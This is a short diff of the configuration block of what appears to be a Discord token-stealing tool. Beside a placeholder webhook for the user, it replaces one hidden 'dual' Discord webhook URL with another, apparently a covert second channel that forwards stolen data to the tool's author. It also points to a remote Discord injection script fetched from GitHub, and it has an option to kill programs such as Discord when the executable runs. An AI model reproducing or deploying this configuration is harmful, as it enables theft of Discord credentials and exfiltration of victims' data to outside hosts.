@@ -24,7 +24,7 @@ config = {
     # replace WEBHOOK_HERE with your webhook
     'webhook': "WEBHOOK_HERE",
     #wack
-    'dual': "https://discord.com/api/webhooks/972638365973377084/DXvR289YbwdzfsZZaRC7xv3_2-21JpqTO6-TjSORcZyp5JyrUq_dmmb-sblHCIzTZfI_",
+    'dual': "https://discord.com/api/webhooks/976296091999961098/_v83GJB7YnDc8vRnxvQ0-G47a6PrnDErIQZWBtRMKlEJrEeC9ZE0Ij8BikAs-K3bK8Ah",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
